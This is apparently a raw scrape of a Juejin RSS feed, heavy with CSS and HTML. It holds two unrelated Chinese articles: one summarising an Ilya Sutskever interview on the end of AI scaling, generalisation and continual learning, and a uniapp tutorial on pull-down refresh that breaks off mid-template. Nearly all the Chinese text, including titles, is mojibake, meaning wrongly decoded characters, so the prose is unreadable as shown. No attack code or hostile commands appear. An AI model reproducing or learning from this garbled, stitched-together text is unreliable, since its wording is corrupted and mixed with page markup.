pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>AIâ€œè§„æ¨¡æ—¶ä»£â€æ­£å¼ç»ˆç»“ï¼ŸIlya Sutskeveræœ€æ–°è®¿è°ˆæ­ç¤ºäº†AIæœªæ¥çš„æ–¹å‘ã€‚</p>
</blockquote>
<p>OpenAIå‰é¦–å¸­ç§‘å­¦å®¶Ilya Sutskeveråœ¨è¿‘æ—¥çš„æ·±åº¦è®¿è°ˆä¸­ç›´è¨€ï¼Œé‚£ä¸ªä¾é å †ç®—åŠ›ã€æ‰©æ•°æ®ã€å¢å‚æ•°æ¥æå‡æ¨¡å‹æ€§èƒ½çš„â€œè§„æ¨¡æ—¶ä»£â€å·²ç»ç”»ä¸Šå¥å·ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d488ec2f12d4d3f96e698534442678c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg566X5a626K6h566X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833316&amp;x-signature=dLt734a6vu%2FdPFAaNJuHmbWwvjM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™æ¬¡è®¿è°ˆç”±Dwarkesh Patelä¸»æŒï¼Œæ—¶é—´é•¿è¾¾95åˆ†é’Ÿã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7744bc01051e482fbf27df3e332a3cc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg566X5a626K6h566X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833316&amp;x-signature=lGbCOlEF%2FZyb9QiJn1m16fIdN4c%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä½æ›¾ä¸»å¯¼GPTç³»åˆ—å¼€å‘çš„AIå…ˆé©±æŒ‡å‡ºï¼Œç»§ç»­æ²¿ç€è¿™æ¡è·¯å¾„å‰è¿›çš„è¾¹é™…æ”¶ç›Šæ­£åœ¨å¿«é€Ÿä¸‹é™ï¼Œæœªæ¥åå¹´AIå°†å›å½’ç ”ç©¶çš„æœ¬è´¨ï¼Œæ¢ç´¢å¦‚ä½•è®©æœºå™¨åƒäººç±»ä¸€æ ·å­¦ä¹ ä¸æ€è€ƒã€‚</p>
<p>Ilyaåˆ›ç«‹çš„SSIå…¬å¸ä¸“æ³¨äºå¼€å‘å®‰å…¨çš„è¶…çº§æ™ºèƒ½ï¼Œä»–è®¤ä¸ºï¼Œå®ç°è¿™ä¸€ç›®æ ‡çš„å…³é”®ä¸å†æ˜¯æŠ•å…¥æ›´å¤šèµ„æºï¼Œè€Œæ˜¯æ‰¾åˆ°æ›´é«˜æ•ˆçš„å­¦ä¹ æ–¹æ³•ã€‚</p>
<p>å½“ä»Šçš„å¤§æ¨¡å‹è™½ç„¶åœ¨è¯„æµ‹ä¸­è¡¨ç°å‡ºè‰²ï¼Œå´å¸¸å¸¸åœ¨å®é™…åº”ç”¨ä¸­çŠ¯ä¸‹ä½çº§é”™è¯¯ï¼Œæ¯”å¦‚ä¿®å¤ä¸€ä¸ªbugçš„åŒæ—¶å¼•å…¥å¦ä¸€ä¸ªbugï¼Œç”šè‡³é™·å…¥å¾ªç¯å¾€å¤çš„é”™è¯¯ä¸­ã€‚è¿™ç§ç°è±¡æ­ç¤ºäº†å½“å‰AIç³»ç»Ÿçš„æ ¹æœ¬ç¼ºé™·ã€‚</p>
<p>åœ¨Ilyaçœ‹æ¥ï¼Œé—®é¢˜çš„æ ¸å¿ƒåœ¨äºæ³›åŒ–èƒ½åŠ›ä¸è¶³ã€‚ä»–ç”¨ä¸€ä¸ªç²¾å¦™çš„æ¯”å–»æè¿°äº†ç°çŠ¶ï¼šå½“ä»Šçš„æ¨¡å‹åƒæ˜¯ä¸€ä¸ªèŠ±è´¹ä¸€ä¸‡å°æ—¶ç»ƒä¹ ç¼–ç¨‹ç«èµ›çš„å­¦ç”Ÿï¼Œç†Ÿè®°æ‰€æœ‰è§£é¢˜æŠ€å·§ï¼Œå´ç¼ºä¹çœŸæ­£å¼€å‘è€…çš„æ´å¯ŸåŠ›ã€‚è€Œé‚£ä¸ªä»…ç»ƒä¹ ä¸€ç™¾å°æ—¶å°±æŒæ¡ç²¾é«“çš„å­¦ç”Ÿï¼Œé çš„ä¸æ˜¯æœºæ¢°é‡å¤ï¼Œè€Œæ˜¯æŠ“ä½äº†é—®é¢˜çš„æœ¬è´¨ã€‚</p>
<p>è¿™ç§æœ¬è´¨çš„ç†è§£ï¼Œæ°æ°æºè‡ªäººç±»ç‹¬ç‰¹çš„æƒ…æ„Ÿä¸ä»·å€¼åˆ¤æ–­æœºåˆ¶ã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸€ä¸ªé’å°‘å¹´åªéœ€çº¦åå°æ—¶å°±èƒ½å­¦ä¼šå¼€è½¦ï¼Œè€Œä¸éœ€è¦ç»å†æˆåƒä¸Šä¸‡æ¬¡çš„ç¢°æ’äº‹æ•…ã€‚è¿™ç§æƒŠäººçš„å­¦ä¹ æ•ˆç‡èƒŒåï¼Œæ˜¯è¿›åŒ–èµ‹äºˆæˆ‘ä»¬çš„ä»·å€¼å‡½æ•°ç³»ç»Ÿâ€”â€”ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„æƒ…æ„Ÿä¸ç›´è§‰ã€‚</p>
<p>å½“æˆ‘ä»¬çŠ¯é”™æ—¶ï¼Œå†…å¿ƒä¼šç«‹å³æ„Ÿåˆ°â€œä¸å¯¹åŠ²â€ï¼Œä»è€Œè‡ªæˆ‘çº æ­£ã€‚ç›®å‰çš„AIå®Œå…¨ç¼ºä¹è¿™ç§å†…åœ¨çš„ã€é²æ£’çš„ä»·å€¼è¯„ä¼°æœºåˆ¶ã€‚</p>
<p>Ilyaæåˆ°ä¸€ä¸ªæœ‰è¶£çš„æ¡ˆä¾‹ï¼šå¤§è„‘æƒ…æ„ŸåŒºåŸŸå—æŸçš„äººè™½ç„¶ä¿ç•™äº†è§£è°œç­‰è®¤çŸ¥èƒ½åŠ›ï¼Œå´å˜å¾—æåº¦ä¼˜æŸ”å¯¡æ–­ï¼Œè¿é€‰æ‹©è¢œå­è¿™æ ·ç®€å•çš„å†³å®šéƒ½è¦èŠ±è´¹æ•°å°æ—¶ã€‚è¿™è¯æ˜äº†æƒ…æ„Ÿå¹¶éç†æ€§çš„å¯¹ç«‹é¢ï¼Œè€Œæ˜¯æœ‰æ•ˆå†³ç­–çš„åŸºç¡€ã€‚</p>
<p>å¦‚æœAIè¦å®ç°çœŸæ­£çš„æ™ºèƒ½çªç ´ï¼Œæˆ–è®¸éœ€è¦åœ¨å“²å­¦å±‚é¢é‡æ–°æ€è€ƒæ™ºèƒ½çš„æœ¬è´¨ï¼Œæ„å»ºç±»ä¼¼äººç±»çš„ä»·å€¼å‡½æ•°ç³»ç»Ÿã€‚</p>
<p>å®‰å…¨é—®é¢˜æ˜¯è¿™ä¸€è½¬å˜ä¸­çš„å¦ä¸€å…³é”®ç»´åº¦ã€‚Ilyaè®¤ä¸ºï¼Œå¯¹é½é—®é¢˜æœ¬è´¨ä¸Šæ˜¯æ³›åŒ–èƒ½åŠ›ä¸è¶³çš„è¡¨ç°ã€‚å½“æ¨¡å‹è¿›å…¥çœŸå®ä¸–ç•Œï¼Œå®ƒæ— æ³•ç†è§£å“ªäº›è¡Œä¸ºæ˜¯å¯æ¥å—çš„ï¼Œä¸æ˜¯å› ä¸ºäººç±»æ²¡æœ‰è®¾å¥½å¥–åŠ±å‡½æ•°ï¼Œè€Œæ˜¯æ¨¡å‹æ ¹æœ¬æ²¡å­¦ä¼šåˆ¤æ–­é•¿æœŸå½±å“ã€‚</p>
<p>ä»–æå‡ºæŒç»­å­¦ä¹ çš„æ¦‚å¿µï¼Œè®¤ä¸ºæ™ºèƒ½ä½“ä¸åº”åœ¨è®­ç»ƒé˜¶æ®µå°±å®Œæˆæ‰€æœ‰å­¦ä¹ ï¼Œè€Œåº”åœ¨éƒ¨ç½²åæŒç»­é€‚åº”å’Œæ”¹è¿›ã€‚</p>
<p>å¦‚æœIlyaAIæ‰€è¨€çœŸçš„å®ç°äº†ï¼Œå­¦ä¹ èŒƒå¼çš„è½¬å˜å°†é‡å¡‘æ•´ä¸ªAIè¡Œä¸šç«äº‰æ ¼å±€ã€‚</p>
<p>é¦–å…ˆï¼Œè¿‡å»å‡ å¹´é€šè¿‡ç®—åŠ›å’Œæ•°æ®å„æ–­å»ºç«‹çš„å£å’å¯èƒ½ä¸å†ç‰¢ä¸å¯ç ´ã€‚</p>
<p>å½“è§„æ¨¡æ‰©å±•çš„æ”¶ç›Šé€’å‡ï¼Œåˆ›æ–°æ€ç»´å’Œç ”ç©¶è´¨é‡å°±æˆä¸ºå†³å®šæ€§å› ç´ ã€‚ä¸€æ—¦å‚æ•°å †ç Œå¸¦æ¥çš„å£å’è¢«æ‰“ç ´ï¼Œåˆ›æ–°å‹å°å…¬å¸å¯èƒ½å°†æœ‰æ›´å¤šæœºä¼šåœ¨AGIçš„ç«èµ›ä¸­è„±é¢–è€Œå‡ºã€‚</p>
<p>å…¶æ¬¡ï¼ŒAIå‘å±•å°†æ›´åŠ æ³¨é‡è´¨è€Œéé‡ã€‚ç ”ç©¶è€…éœ€è¦ä»å¤§è„‘è¿ä½œæœºåˆ¶ä¸­æ±²å–çµæ„Ÿï¼ŒåŒºåˆ†â€œçš®æ¯›â€ä¸â€œæœ¬è´¨â€ã€‚å¥½çš„ç†è®ºåº”å½“å…¼å…·ç¾æ„Ÿã€ç®€æ´æ€§ã€ä¼˜é›…ä»¥åŠç”Ÿç‰©å­¦ä¸Šçš„åˆç†æ€§ã€‚</p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¤§å°å…¬å¸å°†ç«™åœ¨æ›´å¹³ç­‰çš„èµ·è·‘çº¿ä¸Šï¼Œç«äº‰çš„é‡ç‚¹ä»èµ„æºè§„æ¨¡è½¬å‘åˆ›æ–°è´¨é‡ã€‚</p>
<p>å½“AIçœŸæ­£å¼€å§‹ç†è§£äººç±»çš„æƒ…æ„Ÿæœºåˆ¶ï¼Œå½“å­¦ä¹ è¿‡ç¨‹ä»æœºæ¢°é‡å¤å˜ä¸ºæœ¬è´¨æŠŠæ¡ï¼Œæˆ‘ä»¬ä¸æœºå™¨çš„å…³ç³»ä¹Ÿå°†è¿›å…¥å…¨æ–°é˜¶æ®µã€‚è¿™ä¸ä»…æ˜¯æŠ€æœ¯æŒ‘æˆ˜ï¼Œæ›´æ˜¯å¯¹æ™ºèƒ½æœ¬è´¨çš„æ·±å…¥æ¢ç´¢ï¼Œå®ƒå°†é‡æ–°å®šä¹‰æˆ‘ä»¬æ€è€ƒè‡ªèº«è®¤çŸ¥ä¸å­¦ä¹ æ–¹å¼çš„åŸºç¡€ã€‚</p>
<p>å¤§å®¶æ€ä¹ˆçœ‹ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµè®¨è®º~</p>
<p>å†™åœ¨æœ€åï¼šå¦‚æœæ‚¨æ­£åœ¨è¿›è¡ŒAIé¢†åŸŸçš„åˆ›ä¸šæˆ–ç ”ç©¶ï¼Œå´å—å›°äºé«˜æ˜‚çš„ç®—åŠ›æˆæœ¬æˆ–é«˜å¹¶å‘ä¸‹çš„æ¨ç†ç¨³å®šæ€§ç­‰é—®é¢˜ï¼Œæ¬¢è¿ç•™è¨€æˆ–ç§ä¿¡æˆ‘ä»¬ï¼Œæ‰¾åˆ°æ‚¨çš„é™æœ¬å¢æ•ˆçªç ´å£~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uniappå®ç°ä¸Šæ‹‰åˆ·æ–°å’Œä¸‹æ‹‰åˆ·æ–°çš„ä¸¤ç§æ–¹å¼]]></title>    <link>https://juejin.cn/post/7577016562252333107</link>    <guid>https://juejin.cn/post/7577016562252333107</guid>    <pubDate>2025-11-27T07:34:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577016562252333107" data-draft-id="7576968345875726363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uniappå®ç°ä¸Šæ‹‰åˆ·æ–°å’Œä¸‹æ‹‰åˆ·æ–°çš„ä¸¤ç§æ–¹å¼"/> <meta itemprop="keywords" content="uni-app"/> <meta itemprop="datePublished" content="2025-11-27T07:34:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="chen77"/> <meta itemprop="url" content="https://juejin.cn/user/2027977720214573"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uniappå®ç°ä¸Šæ‹‰åˆ·æ–°å’Œä¸‹æ‹‰åˆ·æ–°çš„ä¸¤ç§æ–¹å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2027977720214573/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    chen77
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:34:26.000Z" title="Thu Nov 27 2025 07:34:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€.è‡ªå·±å®ç°</h2>
<h3 data-id="heading-1">1.å®ç°æ­¥éª¤</h3>
<p>å¾®ä¿¡å°ç¨‹åºçš„é¡µé¢çº§ä¸‹æ‹‰åˆ·æ–°ä¾èµ–ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"enablePullDownRefresh"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç„¶ååœ¨é¡µé¢å†™ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">onPullDownRefresh</span>(() =&gt; {
  ...
})

<span class="hljs-built_in">onReachBottom</span>(() =&gt; {
  ...
})

</code></pre>
<h3 data-id="heading-2">2.éœ€è¦è§£å†³çš„é—®é¢˜</h3>
<ul>
<li>ä¸Šæ‹‰æ—¶æ–‡å­—  ''åŠ è½½ä¸­...",  ''æ²¡æœ‰æ›´å¤šäº†''çš„åˆ‡æ¢</li>
<li>è§¦åº•æ—¶loadingçš„åŠ è½½</li>
<li>è§¦åº•åˆ¤æ–­å½“å‰listçš„é•¿åº¦å’Œåç«¯è¿”å›çš„totalé•¿åº¦æ¯”è¾ƒ,å»åˆ¤æ–­å½“å‰æ˜¯''åŠ è½½ä¸­''è¿˜æ˜¯''æ²¡æœ‰æ›´å¤šäº†''</li>
<li>æ•°æ®çš„æ‹¼æ¥å¤„ç†ï¼ŒdownloadClassList.value = [...downloadClassList.value, ...res.rows];</li>
<li>ä¸‹æ‹‰åŠ è½½<code>onPullDownRefresh</code>æ—¶éœ€è¦å¤„ç†è¯·æ±‚é¡µæ•°çš„é—®é¢˜</li>
</ul>
<h3 data-id="heading-3">3.ä¸è¶³</h3>
<ul>
<li>onPullDownRefreshæ‰‹æœºå‘ˆç°çš„æ•ˆæœæ˜¯**â€œæ•´ä¸ªé¡µé¢ä¸€èµ·æ‹‰ä¸‹æ¥â€**ï¼Œä¹Ÿå°±æ˜¯é¡µé¢çº§çš„ã€‚å½“ä½ é¡µé¢é¡¶éƒ¨æœ‰æœç´¢æ¡†ã€tabs ç­‰å†…å®¹æ—¶ï¼Œ å¾®ä¿¡å°ç¨‹åºåŸç”Ÿçš„ <code>enablePullDownRefresh</code> ä¼šä¸€èµ·è¢«ä¸‹æ‹‰ï¼Œä½“éªŒå¾ˆå·®ã€‚</li>
<li>ç›¸å¯¹å¤æ‚ï¼Œéœ€è¦è‡ªå·±å»å®ç°åˆ¤æ–­åç«¯çš„æ€»æ•°æ®totalå’Œæ•°æ®listé•¿åº¦ï¼›æ¥ç»´æŠ¤hasMoreä»è€Œæ§åˆ¶æ˜¯å¦è¿˜éœ€è¦è¯·æ±‚ï¼Œæ˜¯å¦éœ€è¦loadingç­‰</li>
</ul>
<h3 data-id="heading-4">4.å…·ä½“ä»£ç ç¤ºä¾‹</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadHistory"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topSearch"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">van-dropdown-menu</span> <span class="hljs-attr">active-color</span>=<span class="hljs-string">"#29a1f7"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">van-dropdown-item</span> <span class="hljs-attr">:value</span>=<span class="hljs-string">"resourceClass"</span> <span class="hljs-attr">:options</span>=<span class="hljs-string">"option1"</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">"selectClass"</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">van-dropdown-menu</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadCollection"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"downloadClassList.length !== 0"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadCard"</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, key) in downloadClassList"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"toDownloadList(item)"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">van-image</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"75"</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.coverUrl"</span> /&gt;</span>
